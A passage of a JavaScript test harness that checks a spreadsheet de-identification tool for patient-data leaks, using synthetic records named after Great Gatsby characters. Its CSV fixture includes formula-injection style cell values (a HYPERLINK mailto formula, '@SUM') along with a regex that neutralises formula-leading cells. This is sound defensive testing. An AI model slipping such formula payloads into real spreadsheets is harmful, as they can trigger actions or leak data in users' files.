      classifyHits(res, chk, leaks, rows, `seed ${300 + seed} ${vname}`);
      surrogateReuse(res, `seed ${300 + seed} ${vname}`, `S.make({n:60,seed:${300 + seed}}) + variant ${vname} \u2192 processTable`);
    }
  }
  function surrogateReuse(res, label, reproBase) {
      // 3.3 surrogates must not reuse a census patient's name token
      const tokens = new Map();
      for (const p of res.census.patients.values()) {
        [...p.names].concat(p.parsed ? [`${p.parsed.last}, ${p.parsed.first}`] : []).forEach((nm) => String(nm).split(/[\s,.\-']+/).forEach((t) => { if (t.length >= 4 && !ambiguous(t)) tokens.set(t.toLowerCase(), nm); }));
      }
      const idDigits = new Map();
      for (const p of res.census.patients.values()) [...(p.mrns || []), ...(p.accounts || [])].forEach((v) => { const d = String(v).replace(/\D/g, '').replace(/^0+/, ''); if (d.length >= 6) idDigits.set(d, String(v)); });
      res.rows.forEach((row, ri) => row.forEach((v, ci) => {
        if (typeof v !== 'string' || res.headers[ci] === 'DeID Audit') return;
        const inDigits = new Set(digitRuns(D.cellToString(((res.details[ri] || {}).cells || []).find((c) => c.col === ci) ? res.details[ri].cells.find((c) => c.col === ci).original : '')));
        digitRuns(v).forEach((run) => idDigits.forEach((orig, d) => { if ((run.includes(d) || run.replace(/^0+/, '').includes(d)) && ![...inDigits].some((x) => x.includes(d))) probs33.push({ sev: 'major', label, msg: `output cell [${ri},${ci}] ${jstr(v, 80)} contains the digits of census identifier ${orig}, and the input cell did not`, repro: `${reproBase} \u2192 result.rows[${ri}][${ci}]`, observed: `surrogate output ${jstr(v, 80)} carries real identifier digits ${orig}`, expected: 'surrogate phones/codes/dates never reproduce a census MRN or account number' }); }));
      }));
      res.details.forEach((d) => d.cells.forEach((c) => (c.replacements || []).forEach((r) => {
        String(r.replacement || '').split(/[\s,.\-'()]+/).forEach((t) => {
          const k = t.toLowerCase();
          if (k.length >= 4 && tokens.has(k) && !String(r.original || '').toLowerCase().includes(k)) probs33.push({ sev: 'major', label, msg: `${r.type} surrogate "${r.replacement}" (for "${r.original}") reuses census patient name token "${t}" (patient "${tokens.get(k)}")`, repro: `${reproBase} \u2192 details[${d.row}].cells[col ${c.col}].replacements`, observed: `surrogate "${r.replacement}" (for "${r.original}") contains the real patient name token "${t}" (patient "${tokens.get(k)}"); the self-check then flags an otherwise clean file`, expected: 'surrogate pools exclude every census name token (no real patient name in output, no false alarm)' });
        });
      })));
  }
  // 3.3 on long tables too: the surrogate pools are drawn many more times
  for (const seed of (QUICK ? [11] : [11, 12, 13])) {
    progress(`3 surrogate reuse n=2000 seed ${seed}`);
    const s = S.make({ n: 2000, seed });
    const res = D.processTable({ headers: s.headers, rows: s.rows }, { seed: 1, registry: D.createRegistry() });
    surrogateReuse(res, `n=2000 seed ${seed}`, `S.make({n:2000,seed:${seed}}) \u2192 processTable(\u2026, {seed:1})`);
    const chk = D.selfCheck(res, { kind: 'table' });
    const leaks = findLeaks(res, s.patients);
    probs31.push(...classifyLeaks(leaks, chk, `table n=2000 seed ${seed}`, (L) => `S.make({n:2000,seed:${seed}}) \u2192 processTable(\u2026, {seed:1}); patient ${L.p.last}, ${L.p.first}`));
    runs++;
    classifyHits(res, chk, leaks, s.rows, `n=2000 seed ${seed}`);
  }
  // 3.2 patient list (roster) seeded into the session registry, then free text that names the patients
  for (let seed = 1; seed <= (QUICK ? 2 : 6); seed++) {
    progress(`3 roster seed ${seed}`);
    const s = S.make({ n: 30, seed: 400 + seed });
    const pts = s.patients.slice(0, 10);
    const reg = D.createRegistry();
    const rosterHeaders = ['Patient Name', 'MRN', 'DOB'];
    const rosterRows = pts.map((p) => [p.nameCell, p.mrn, `${p.dob.getMonth() + 1}/${p.dob.getDate()}/${p.dob.getFullYear()}`]);
    D.buildCensus(rosterHeaders, rosterRows, rosterHeaders.map((h, i) => ({ header: h, index: i, role: ['patient_name', 'mrn', 'dob'][i] })), { registry: reg });
    const vnames = Object.keys(VARIANTS);
    const lines = [];
    pts.forEach((p, k) => {
      const V = VARIANTS[vnames[k % vnames.length]];
      const mrnSp = String(p.mrn).length >= 8 ? `${String(p.mrn).slice(0, 4)} ${String(p.mrn).slice(4)}` : p.mrn;
      lines.push(`${V(`${p.first} ${p.last}`)} called re: labs, MRN ${p.mrn}.`, `Spoke with ${V(`${p.last}, ${p.first}`)} today about chair time.`, `Reminder: ${V(`${p.first} ${p.last}`)} (MRN ${mrnSp}) to bring med list.`);
    });
    const checkPts = pts.filter((p, k) => vnames[k % vnames.length] !== 'lower' || !(ambiguous(p.first) || ambiguous(p.last))).map((p) => Object.assign({}, p, { acct: null, phone: null }));
    // (a) a free-text column
    const regA = D.createRegistry(); D.buildCensus(rosterHeaders, rosterRows, rosterHeaders.map((h, i) => ({ header: h, index: i, role: ['patient_name', 'mrn', 'dob'][i] })), { registry: regA });
    const resA = D.processTable({ headers: ['Note'], rows: lines.map((l) => [l]) }, { columns: [{ header: 'Note', role: 'text' }], registry: regA, seed: 1 });
    probs32.push(...classifyLeaks(findLeaks(resA, checkPts), D.selfCheck(resA, { kind: 'table' }), `roster seed ${400 + seed} (text column)`, (L) => `registry seeded with roster [${L.p.nameCell} | ${L.p.mrn}] via buildCensus; processTable({headers:["Note"], rows:[[${jstr(lines[L.ri], 160)}]]}, {columns:[{role:"text"}], registry})`));
    // (b) the same lines pasted as text
    const doc = D.parseTextDocument(lines.join('\n'));
    const resB = D.processTable({ headers: doc.headers, rows: doc.rows }, { columns: doc.columns, registry: reg, seed: 1 });
    probs32.push(...classifyLeaks(findLeaks(resB, checkPts), D.selfCheck(resB, { kind: 'text' }), `roster seed ${400 + seed} (pasted text)`, (L) => `registry seeded with roster [${L.p.nameCell} | ${L.p.mrn}]; parseTextDocument(<lines>) \u2192 processTable({columns:doc.columns, registry}); output cell ${jstr(L.cell, 160)}`));
  }
  emitCheck(3, '3.1', `census guarantee on ${runs} synthetic tables (name variants: ${Object.keys(VARIANTS).join(', ')}; injected "First Last"/"Last, First", spaced MRN, account, phone; plus 2,000-row tables as-is)`, probs31);
  emitCheck(3, '3.2', 'patient-list guarantee: roster seeded into the registry, then free text and pasted text naming those patients', probs32);
  emitCheck(3, '3.3', 'surrogates (fake names, orgs, places) never reuse a census patient\'s name token', dedupe(probs33));
  const fmtMap = (m) => [...m.entries()].sort((a, b) => b[1].n - a[1].n).slice(0, 5).map(([k, v]) => `${k} x${v.n} (${v.ex})`).join(' || ');
  emit({ sec: 3, id: '3.4a', name: `self-check hits on text the tool wrote itself (false alarms that block a clean file): ${selfIntroduced.size ? fmtMap(selfIntroduced) : 'none'}`, status: selfIntroduced.size ? 'WARN' : 'INFO' });
  emit({ sec: 3, id: '3.4b', name: `census tokens other than full names/identifiers that survived and were caught by the self-check (download blocked): ${caught.size ? fmtMap(caught) : 'none'}`, status: caught.size ? 'WARN' : 'INFO' });
  // 3.5 header cells are protected or checked
  {
    const res = D.processTable({ headers: ['Patient Name', 'MRN', 'Comments re Gatsby, Jay 41832795'], rows: [['Gatsby, Jay', '41832795', 'called re: labs']] }, { seed: 1 });
    const chk = D.selfCheck(res, { kind: 'table' });
    const leaks = findLeaks(res, [{ first: 'Jay', last: 'Gatsby', mrn: '41832795' }]).filter((L) => L.ri < 0);
    probs34.push(...classifyLeaks(leaks, chk, 'header cell with patient PHI', () => 'D.processTable({headers:["Patient Name","MRN","Comments re Gatsby, Jay 41832795"], rows:[["Gatsby, Jay","41832795","called re: labs"]]}, {}) \u2192 result.headers[2]'));
  }
  emitCheck(3, '3.5', 'header cells carrying a census patient\'s name/MRN are protected or flagged', probs34);
}
function dedupe(list) { const seen = new Set(); return list.filter((p) => { const k = p.msg.replace(/ \(for .*?\)/, ''); if (seen.has(k)) return false; seen.add(k); return true; }); }

// =================================================================== section 4: workbook path
function extractDecl(src, name) {
  // a top-level `function name(...) {...}` or `const name = ...;` from src/app.js, by brace matching (strings skipped)
  let i = src.indexOf(`function ${name}(`);
  const isFn = i >= 0;
  if (!isFn) { const m = new RegExp(`\\bconst ${name}\\s*=`).exec(src); if (!m) return null; i = m.index; }
  let depth = 0, j = i, started = false;
  for (; j < src.length; j++) {
    const ch = src[j];
    if (ch === '\'' || ch === '"' || ch === '`') { const q = ch; j++; while (j < src.length && src[j] !== q) { if (src[j] === '\\') j++; j++; } continue; }
    if (ch === '/' && src[j + 1] === '/') { while (j < src.length && src[j] !== '\n') j++; continue; }
    if ('({['.includes(ch)) { depth++; started = true; }
    else if (')}]'.includes(ch)) { depth--; if (isFn && depth === 0 && ch === '}' && started) { j++; break; } }
    else if (!isFn && ch === ';' && depth === 0) { j++; break; }
    else if (!isFn && ch === '\n' && depth === 0 && started && /[)\]};]\s*$/.test(src.slice(i, j))) break;
  }
  return src.slice(i, j);
}
function loadAppPieces(XLSX, D) {
  const appSrc = fs.readFileSync(SRC('app.js'), 'utf8');
  const names = ['fmtDate', 'FORMULA_START', 'localSafeCell', 'safeCell', 'safeAoa', 'AUDIT_OFFSET', 'sheetToAoa', 'detectHeaderRow', 'aoaOut'];
  const notes = [];
  let app = null;
  try {
    const code = names.map((n) => { const d = extractDecl(appSrc, n); if (!d) throw new Error(`could not find ${n} in src/app.js`); return d; }).join('\n');
    app = new Function('XLSX', 'DeID', `${code}\nreturn { ${names.join(', ')} };`)(XLSX, D);
    if (app.safeCell('=1+1') !== "'=1+1" || app.detectHeaderRow([['t'], ['A', 'B'], [1, 2]]) !== 1) throw new Error('extracted functions do not behave as expected');
  } catch (e) {
    notes.push(`extraction from src/app.js failed (${e.message}); using the harness's copy of the page functions`);
    const FORMULA_START = /^[=+\-@\t\r\uFF1D\uFF0B\uFF0D\uFF20]/;
    const localSafeCell = (v) => (typeof v === 'string' && FORMULA_START.test(v) ? `'${v}` : v);
    const safeCell = (v) => { let out = v; if (typeof D.safeCell === 'function') { try { out = D.safeCell(v); } catch (er) { out = v; } } return localSafeCell(out); };
    const safeAoa = (aoa) => aoa.map((r) => (Array.isArray(r) ? r.map(safeCell) : safeCell(r)));
    const AUDIT_OFFSET = /\s*\|\s*shift:[+-]?\d+d\b/g;
    app = {
      fmtDate: (v) => (v instanceof Date ? `${v.getMonth() + 1}/${v.getDate()}/${v.getFullYear()}` : v), FORMULA_START, localSafeCell, safeCell, safeAoa, AUDIT_OFFSET,
      sheetToAoa: (ws) => XLSX.utils.sheet_to_json(ws, { header: 1, raw: true, defval: null, blankrows: false }),
      detectHeaderRow: (aoa) => { let best = 0, bestScore = -1; for (let i = 0; i < Math.min(15, aoa.length); i++) { const row = aoa[i] || []; const strs = row.filter((v) => typeof v === 'string' && v.trim() && !/^\d+(\.\d+)?$/.test(v.trim())).length; const filled = row.filter((v) => v != null && v !== '').length; const score = strs * 2 + filled - (row.filter((v) => v instanceof Date).length * 3); if (score > bestScore && filled >= 2) { bestScore = score; best = i; } } return best; },
      aoaOut: (item) => { const r = item.result; const ai = r.headers.indexOf('DeID Audit'); return safeAoa([r.headers, ...r.rows.map((row) => { if (ai < 0) return row; const o = row.slice(); o[ai] = String(o[ai] == null ? '' : o[ai]).replace(AUDIT_OFFSET, ' | dates shifted'); return o; })]); },
    };
  }
  // XLSX.read options and the buildTable header/rows lines, as the page has them
  let readOpts = { type: 'array', cellDates: true, raw: false };
  const ro = appSrc.match(/XLSX\.read\(new Uint8Array\(r\.result\),\s*(\{[^}]*\})\)/);
  if (ro) { try { readOpts = new Function(`return ${ro[1]};`)(); } catch (e) { notes.push('could not parse readWorkbook options; using {type:"array", cellDates:true, raw:false}'); } } else notes.push('readWorkbook options not found in src/app.js; using {type:"array", cellDates:true, raw:false}');
  let tableFrom = null;
  const hl = appSrc.match(/const headers = \(aoa\[item\.headerRow\][^\n]*;/), rl = appSrc.match(/const rows = aoa\.slice\(item\.headerRow \+ 1\)[^\n]*;/);
  if (hl && rl) { try { tableFrom = new Function('aoa', 'item', `${hl[0]}\n${rl[0]}\nreturn { headers, rows };`); } catch (e) { tableFrom = null; } }
  if (!tableFrom) {
    notes.push('buildTable lines not found in src/app.js; using the harness copy');
    tableFrom = (aoa, item) => { const headers = (aoa[item.headerRow] || []).map((h, i) => (h == null || h === '' ? `Column ${i + 1}` : String(h))); const rows = aoa.slice(item.headerRow + 1).filter((r) => r && r.some((v) => v != null && v !== '')).map((r) => headers.map((_, i) => (r[i] == null ? null : r[i]))); return { headers, rows }; };
  }
  return { app, readOpts, tableFrom, notes };
}
function zipText(XLSX, buf) {
  const cfb = XLSX.CFB.read(buf, { type: 'buffer' });
  const out = [];
  cfb.FileIndex.forEach((fi, k) => {
    if (!fi || !fi.content || !fi.content.length) return;
    const txt = Buffer.from(fi.content).toString('utf8').replace(/&amp;/g, '&').replace(/&lt;/g, '<').replace(/&gt;/g, '>').replace(/&quot;/g, '"').replace(/&apos;/g, "'").replace(/&#(\d+);/g, (m, d) => String.fromCharCode(+d));
    out.push([cfb.FullPaths[k], txt]);
  });
  return out;
}
function protectWorkbookLikeThePage(XLSX, D, P, buf, label) {
  const wb = XLSX.read(new Uint8Array(buf), P.readOpts);
  const names = wb.SheetNames;
  const aoa = P.app.sheetToAoa(wb.Sheets[names[0]]);
  const headerRow = P.app.detectHeaderRow(aoa);
  const { headers, rows } = P.tableFrom(aoa, { headerRow });
  const columns = D.classifyColumns(headers, rows);
  const reg = D.createRegistry();
  const result = D.processTable({ headers, rows }, { columns: columns.map((c) => ({ header: c.header, role: c.role })), registry: reg, seed: 11, auditColumn: true, auditDetail: false });
  const chk = D.selfCheck(result, { kind: 'table' });
  const outAoa = P.app.aoaOut({ result });
  const ws = XLSX.utils.aoa_to_sheet(outAoa, { cellDates: true });
  const owb = XLSX.utils.book_new(); XLSX.utils.book_append_sheet(owb, ws, 'Protected');
  const outBuf = XLSX.write(owb, { type: 'buffer', bookType: 'xlsx', cellDates: true });
  const csv = XLSX.utils.sheet_to_csv(XLSX.utils.aoa_to_sheet(outAoa.map((r) => r.map((v) => P.app.safeCell(P.app.fmtDate(v))))));
  return { wb, names, aoa, headerRow, headers, rows, columns, result, chk, outAoa, outBuf, csv, label };
}
function scanOutput(XLSX, run, needles, digitNeedles) {
  const found = [];
  const entries = zipText(XLSX, run.outBuf);
  for (const [nm, txt] of entries) { const low = txt.toLowerCase(); needles.forEach(([what, n]) => { if (low.includes(n.toLowerCase())) found.push({ what, n, where: `output .xlsx entry ${nm}` }); }); }
  const lowCsv = run.csv.toLowerCase(); needles.forEach(([what, n]) => { if (lowCsv.includes(n.toLowerCase())) found.push({ what, n, where: 'CSV export' }); });
  const re = XLSX.read(run.outBuf, { type: 'buffer', cellDates: true, cellFormula: true, cellHTML: false });
  re.SheetNames.forEach((sn) => { const ws = re.Sheets[sn]; Object.keys(ws).filter((k) => k[0] !== '!').forEach((addr) => {
    const c = ws[addr]; const parts = [c.v, c.w, c.f, c.l && c.l.Target, c.c && c.c.map((x) => x.t).join(' ')].filter((x) => x != null && !(x instanceof Date)).map(String);
    parts.forEach((p) => { const runs = digitRuns(p).map((d) => [d, d.replace(/^0+/, '')]); digitNeedles.forEach(([what, d]) => { if (runs.some(([a, b]) => a.includes(d) || b.includes(d))) found.push({ what, n: d, where: `output cell ${sn}!${addr}: ${short(p, 100)}` }); }); });
    if (c.l || (c.c && c.c.length) || c.f) found.push({ what: 'hyperlink/comment/formula object in output', n: JSON.stringify({ l: c.l, c: c.c, f: c.f }), where: `${sn}!${addr}` });
  }); });
  const seen = new Set();
  return found.filter((f) => { const k = `${f.what}|${f.n}|${f.where}`; if (seen.has(k)) return false; seen.add(k); return true; });
}
function section4() {
  const D = loadCore();
  const XLSX = require(path.join(ROOT, 'vendor', 'xlsx.full.min.js'));
  const P = loadAppPieces(XLSX, D);
  P.notes.forEach((n) => emit({ sec: 4, id: '4.0', name: n, status: 'WARN' }));
  const problems = { '4.1': [], '4.2': [], '4.3': [], '4.4': [], '4.5': [] };
  const A = XLSX.utils;

  // ---- 4.1/4.2 the main fixture
  progress('4 build fixture');
  const header = ['Appt Date', 'Patient Name', 'MRN', 'DOB', 'Phone', 'Comments', 'Alt Contact', 'Contact link'];
  const pts = [
    ['Gatsby, Jay', '00418327', '7/4/1950', '716-555-0199'],
    ['Buchanan, Daisy', '00539264', '3/14/1955', '716-555-0142'],
    ['Baker, Jordan', '00661845', '9/9/1960', '585-555-0177'],
    ['Wilson, Myrtle', '00792336', '1/30/1948', '315-555-0110'],
  ];
  const aoa = [
    ['Infusion Schedule - printed for Gatsby, Jay MRN 00418327 - Dr. Wolfsheim'],
    ['Run by: Carraway, Nick 11/09/2026'],
    [],
    header,
    [new Date(2026, 10, 9), ...pts[0], 'Gatsby tolerated infusion; son called', 'jay.gatsby@gmail.com / 716-555-0188', 'email'],
    [new Date(2026, 10, 9), ...pts[1], 'Daisy prefers chair 4', 'daisy.b@outlook.com', 'portal'],
    [new Date(2026, 10, 10), ...pts[2], null, 'jordan.baker.alt@aol.com', 'Contact'],
    [new Date(2026, 10, 10), ...pts[3], 'merged comment', '315-555-0111', null],
  ];
  const ws = A.aoa_to_sheet(aoa, { cellDates: true });
  ws['!merges'] = [{ s: { r: 0, c: 0 }, e: { r: 0, c: 7 } }, { s: { r: 1, c: 0 }, e: { r: 1, c: 7 } }, { s: { r: 7, c: 5 }, e: { r: 7, c: 7 } }];
  ws['!cols'] = header.map((h, i) => (i === 6 ? { hidden: true, wch: 20 } : { wch: 14 }));
  ws['B5'].c = [{ a: 'Carraway, Nick', t: 'Pt goes by Jimmy Gatz; SSN 123-45-6789; cell 716-555-0123' }];
  ws['B5'].c.hidden = true;
  ws['H5'].l = { Target: 'mailto:daisy.buchanan@yahoo.com', Tooltip: 'Daisy Buchanan home email' };
  ws['H6'].l = { Target: 'https://mychart.example.org/patient?mrn=00418327&name=Gatsby' };
  ws['F7'] = { t: 's', f: 'CONCATENATE("Call ","Myrtle"," Wilson")', v: 'Call Myrtle Wilson' };
  ws['H7'] = { t: 's', f: 'HYPERLINK("mailto:jordan.baker@aol.com","Contact")', v: 'Contact' };
  ws['H8'] = { t: 's', v: 'Klipspringer under the merge' }; // a value in a merged-over cell
  ws['G8'] = { t: 'n', f: '"Tom "&"Buchanan"' }; // a formula with no cached value
  const ws2 = A.aoa_to_sheet([['Name', 'MRN', 'SSN', 'Email'], ['Wolfsheim, Meyer', '00777777', '987-65-4320', 'meyer.wolfsheim@gmail.com'], ['Klipspringer, Ewing', '00888888', '111-22-3333', 'ewing.k@outlook.com']]);
  const wb = A.book_new(); A.book_append_sheet(wb, ws, 'Schedule'); A.book_append_sheet(wb, ws2, 'Contacts');
  const buf = XLSX.write(wb, { type: 'buffer', bookType: 'xlsx', cellDates: true });
  progress('4 protect fixture');
  const run = protectWorkbookLikeThePage(XLSX, D, P, buf, 'fixture');
  const needles = [
    ['comment text', 'Jimmy Gatz'], ['comment text', 'Gatz;'], ['comment author / title row', 'Carraway'], ['hyperlink target', 'daisy.buchanan@yahoo.com'], ['hyperlink tooltip', 'home email'],
    ['hyperlink target', 'mychart.example.org'], ['HYPERLINK() formula target', 'jordan.baker@aol.com'], ['title row', 'Wolfsheim'], ['second sheet', 'Meyer'], ['second sheet', 'meyer.wolfsheim'],
    ['second sheet / merged-over cell', 'Klipspringer'], ['second sheet', 'ewing.k@'], ['uncached formula', 'Tom Buchanan'], ['hidden column', 'jay.gatsby@gmail.com'], ['hidden column', 'daisy.b@outlook.com'],
    ['hidden column', 'jordan.baker.alt@aol.com'], ['census name', 'Gatsby'], ['census name', 'Buchanan'], ['census name', 'Daisy'], ['census name', 'Myrtle'], ['census name', 'Baker, Jordan'], ['census name', 'Jordan Baker'],
  ];
  const digitNeedles = [['comment SSN', '123456789'], ['comment phone', '7165550123'], ['second sheet SSN', '987654320'], ['second sheet SSN', '111223333'], ['second sheet MRN', '777777'], ['second sheet MRN', '888888'],
    ['hidden column phone', '7165550188'], ['hidden column phone', '3155550111'], ...pts.map((p) => ['census MRN', p[1].replace(/^0+/, '')]), ...pts.map((p) => ['census phone', p[3].replace(/\D/g, '')])];
  const wantHr = run.aoa.findIndex((r) => r && r[0] === 'Appt Date'); // sheet_to_json drops the blank row (blankrows:false)
  if (run.headerRow !== wantHr) problems['4.1'].push({ sev: 'major', label: 'header detection', msg: `detectHeaderRow picked aoa row ${run.headerRow} (${jstr(JSON.stringify(run.aoa[run.headerRow]), 120)}) instead of the real header (aoa row ${wantHr})`, repro: 'see section4 fixture', observed: `header row ${run.headerRow}`, expected: `header row ${wantHr} (two title rows above it)` });
  const found = scanOutput(XLSX, run, needles, digitNeedles);
  const blocked = run.chk.hits.length > 0;
  const MERGED_NOTE = ' \u2014 this value sits in a cell hidden under a merged range (invisible in Excel) in a column classified "keep", so it is exported unread; Excel itself discards such values when cells are merged, so only odd/crafted files carry them';
  found.forEach((f) => problems['4.1'].push({ sev: f.what.includes('merged-over') && /sheet1\.xml|CSV/.test(f.where) ? 'minor' : blocked ? 'major' : 'blocker', label: f.what + (f.what.includes('merged-over') ? MERGED_NOTE : ''), msg: `"${short(f.n, 80)}" found in ${f.where}${blocked ? ' (self-check blocked the file)' : ' (self-check clean: downloadable)'}`, repro: 'node test/robust.js --only 4 (fixture: title rows, hidden col G, comment on B5, hyperlinks H5/H6, HYPERLINK formula H7, merge F8:H8 with a value in H8, uncached formula G8, second sheet "Contacts")', observed: `${f.what} "${short(f.n, 80)}" in ${f.where}`, expected: 'hyperlink targets, comments, the unselected sheet, title rows above the header and hidden-column PHI never reach the protected file' }));
  const roles = run.columns.map((c) => `${c.header}=${c.role}`).join(', ');
  emit({ sec: 4, id: '4.i', name: `fixture read like the page: header row ${run.headerRow}, roles: ${roles}; self-check hits ${run.chk.hits.length}${run.chk.hits.length ? ' (' + run.chk.hits.slice(0, 3).map((h) => `${h.type} "${h.text}"`).join(', ') + ')' : ''}; errors ${run.result.errors.length}`, status: 'INFO' });
  if (run.result.errors.length) problems['4.1'].push({ sev: 'major', label: 'errors', msg: `processTable reported errors on the fixture: ${run.result.errors[0].message}`, repro: '' });
  emitCheck(4, '4.1', 'xlsx fixture: comments, hyperlink targets, HYPERLINK() formulas, uncached formulas, hidden column, merged-over cell, title rows and the second sheet never reach the written .xlsx/.csv', problems['4.1']);

  // ---- 4.2 CSV input with title rows and formula-looking cells
  progress('4 csv');
  const csvIn = 'Infusion schedule for Gatsby; Jay MRN 00418327\n\nAppt Date,Patient Name,MRN,Comments\n11/9/2026,"Gatsby, Jay",00418327,"=HYPERLINK(""mailto:jay.gatsby@gmail.com"",""mail"")"\n11/9/2026,"Buchanan, Daisy",00539264,"@SUM(1+1) Daisy called"\n11/10/2026,"Baker, Jordan",00661845,"+1 716 555 0144 call Jordan"\n';
  try {
    const runC = protectWorkbookLikeThePage(XLSX, D, P, Buffer.from(csvIn, 'utf8'), 'csv');
    const fc = scanOutput(XLSX, runC, [['CSV title row', 'Gatsby; Jay'], ['formula target', 'jay.gatsby@gmail.com'], ['census', 'Gatsby'], ['census', 'Buchanan'], ['census', 'Jordan']], [['census MRN', '418327'], ['census MRN', '539264'], ['census MRN', '661845'], ['phone', '7165550144']]);
    const bl = runC.chk.hits.length > 0;
    fc.forEach((f) => problems['4.2'].push({ sev: bl ? 'major' : 'blocker', label: f.what, msg: `"${short(f.n, 80)}" in ${f.where}${bl ? ' (blocked)' : ' (downloadable)'}`, repro: `CSV input: ${jstr(csvIn, 300)}`, observed: `${f.what} in ${f.where}`, expected: 'no PHI from the CSV in the protected file' }));
    const wantC = runC.aoa.findIndex((r) => r && r[0] === 'Appt Date');
    if (runC.headerRow !== wantC) problems['4.2'].push({ sev: 'major', label: 'csv header detection', msg: `header row ${runC.headerRow}, expected ${wantC}`, repro: `CSV input: ${jstr(csvIn, 200)}` });
  } catch (e) { problems['4.2'].push({ sev: 'blocker', label: 'csv', msg: `reading/protecting the CSV threw: ${errMsg(e)}`, repro: `CSV input: ${jstr(csvIn, 200)}` }); }
  emitCheck(4, '4.2', 'CSV input with a title row and formula-looking cells', problems['4.2']);

  // ---- 4.3 PHI in the detected header row (key/value layout; a per-patient title block wider than the table)
  progress('4 header row PHI');
  const layouts = {
    'key/value two-column sheet': [['Patient', 'Gatsby, Jay'], ['MRN', '00418327'], ['DOB', '7/4/1950'], ['Phone', '716-555-0199'], ['Comments', 'Gatsby called re: labs']],
    'per-patient title block wider than the table': [['Patient: Gatsby, Jay', 'MRN: 00418327', 'DOB: 7/4/1950', 'Attending: Wolfsheim, Meyer MD', 'Printed 11/9/2026'], [], ['Date', 'Regimen', 'Comments', 'Nurse'], [new Date(2026, 10, 9), 'FOLFOX', 'tolerated well', 'RN Lee'], [new Date(2026, 10, 23), 'FOLFOX', 'son drove', 'RN Lee']],
  };
  for (const [label, rowsAoa] of Object.entries(layouts)) {
    const w = A.book_new(); A.book_append_sheet(w, A.aoa_to_sheet(rowsAoa, { cellDates: true }), 'Sheet1');
    const r = protectWorkbookLikeThePage(XLSX, D, P, XLSX.write(w, { type: 'buffer', bookType: 'xlsx', cellDates: true }), label);
    const fh = scanOutput(XLSX, r, [['patient name', 'Gatsby'], ['attending', 'Wolfsheim']], [['MRN', '418327'], ['phone', '7165550199']]);
    const bl = r.chk.hits.length > 0;
    fh.forEach((f) => problems['4.3'].push({ sev: bl ? 'major' : 'blocker', label, msg: `"${f.n}" in ${f.where}; detected header row ${r.headerRow} = ${jstr(JSON.stringify(r.headers), 140)}; self-check hits ${r.chk.hits.length}`, repro: `sheet rows ${jstr(JSON.stringify(rowsAoa), 260)} read like the page (detectHeaderRow \u2192 processTable \u2192 aoaOut)`, observed: `${f.what} "${f.n}" in the output (${f.where}); result.headers is copied from the input unprocessed and selfCheck does not scan headers`, expected: 'a header row holding PHI is protected (or checked and blocked)' }));
  }
  emitCheck(4, '4.3', 'PHI in the row the page picks as the header (key/value sheet, per-patient title block) is protected or blocked', problems['4.3']);
}

// =================================================================== section 5: scale
function section5() {
  const D = loadCore();
  const S = require(SRC('synth.js'));
  const probs = [];
  const runs = QUICK ? [[5000, 0.4]] : [[20000, 0.4], [5000, 1.0]];
  for (const [n, ratio] of runs) {
    progress(`5 make ${n} ratio ${ratio}`);
    const s = S.make({ n, seed: 500, patientsRatio: ratio });
    progress(`5 processTable ${n} ratio ${ratio}`);
    const t0 = now(); let res = null, threw = null;
    try { res = D.processTable({ headers: s.headers, rows: s.rows }, { seed: 1, registry: D.createRegistry() }); } catch (e) { threw = e; }
    const tp = (now() - t0) / 1000;
    if (threw) { probs.push({ sev: 'blocker', label: `${n} rows`, msg: `processTable threw: ${errMsg(threw)}`, repro: `S.make({n:${n},seed:500,patientsRatio:${ratio}}) \u2192 processTable` }); continue; }
    progress(`5 selfCheck ${n} ratio ${ratio}`);
    const t1 = now(); let chk = null;
    try { chk = D.selfCheck(res, { kind: 'table' }); } catch (e) { probs.push({ sev: 'blocker', label: `${n} rows`, msg: `selfCheck threw: ${errMsg(e)}`, repro: '' }); }
    const tc = (now() - t1) / 1000;
    const limit = n >= 20000 ? 180 : 90;
    emit({ sec: 5, id: `5.t${n}`, name: `${n.toLocaleString()} rows, ${res.census.patients.size} patients: processTable ${tp.toFixed(1)} s, selfCheck ${tc.toFixed(1)} s, errors ${res.errors.length}, self-check hits ${chk ? chk.hits.length : '?'}${chk && chk.hits.length ? ' (e.g. ' + chk.hits.slice(0, 3).map((h) => `${h.type} "${h.text}"`).join(', ') + ')' : ''}`, status: 'INFO' });
    if (res.errors.length) { const e = res.errors[0]; const inp = e.row >= 0 && s.rows[e.row] ? s.rows[e.row] : null; probs.push({ sev: 'major', label: `${n} rows`, msg: `${res.errors.length} internal error(s): ${e.message} at row ${e.row} col ${e.col} (${e.header}); input cell ${inp ? jstr(inp[e.col], 160) : '-'}; row patient ${inp ? jstr(inp[2], 40) : '-'}`, repro: inp ? `D.processTable({headers:['Patient Name','MRN','Comments'], rows:[[${JSON.stringify(D.cellToString(inp[2]))}, '${D.cellToString(inp[3])}', ${JSON.stringify(D.cellToString(inp[e.col]))}]]}, {})  (found in S.make({n:${n},seed:500,patientsRatio:${ratio}}))` : `S.make({n:${n},seed:500,patientsRatio:${ratio}})`, observed: `result.errors: ${e.message} (the whole input is blocked)`, expected: 'no internal error on a clean synthetic export' }); }
    // a hit whose text is not in the input cell was put there by the tool itself (a surrogate colliding with a census token)
    if (chk) {
      const own = chk.hits.filter((h) => h.kind !== 'error' && h.row >= 0 && h.col >= 0 && s.rows[h.row]).filter((h) => {
        const inp = D.cellToString(s.rows[h.row][h.col]); const t = String(h.text);
        if (/\d/.test(t) && !/[A-Za-z]{2}/.test(t)) { const d = t.replace(/\D/g, ''); return !inp.replace(/\D/g, '').includes(d); }
        return !inp.toLowerCase().includes(t.toLowerCase());
      });
      if (own.length) {
        const g = {}; own.forEach((h) => { const k = `${h.type} "${h.text}" (${h.kind})`; g[k] = (g[k] || 0) + 1; });
        const ex = own.slice(0, 1).map((h) => `row ${h.row} col ${h.col}: output ${jstr(res.rows[h.row][h.col], 100)} / input ${jstr(s.rows[h.row][h.col], 100)}`).join('');
        probs.push({ sev: 'major', label: `${n} rows self-introduced hits`, msg: `${own.length} of ${chk.hits.length} self-check hits are text the tool wrote itself (absent from the input cell): ${Object.entries(g).sort((a, b) => b[1] - a[1]).slice(0, 6).map(([k, v]) => `${k} x${v}`).join(', ')}; e.g. ${ex}`, repro: `S.make({n:${n},seed:500,patientsRatio:${ratio}}) \u2192 processTable(\u2026, {seed:1}) \u2192 selfCheck`, observed: `${own.length} hits on surrogates/codes (download of a clean file blocked unless overridden)`, expected: 'surrogates and study codes never collide with census names, identifiers or birthdate digits' });
      }
    }
    if (res.rows.length !== n) probs.push({ sev: 'major', label: `${n} rows`, msg: `output has ${res.rows.length} rows`, repro: '' });
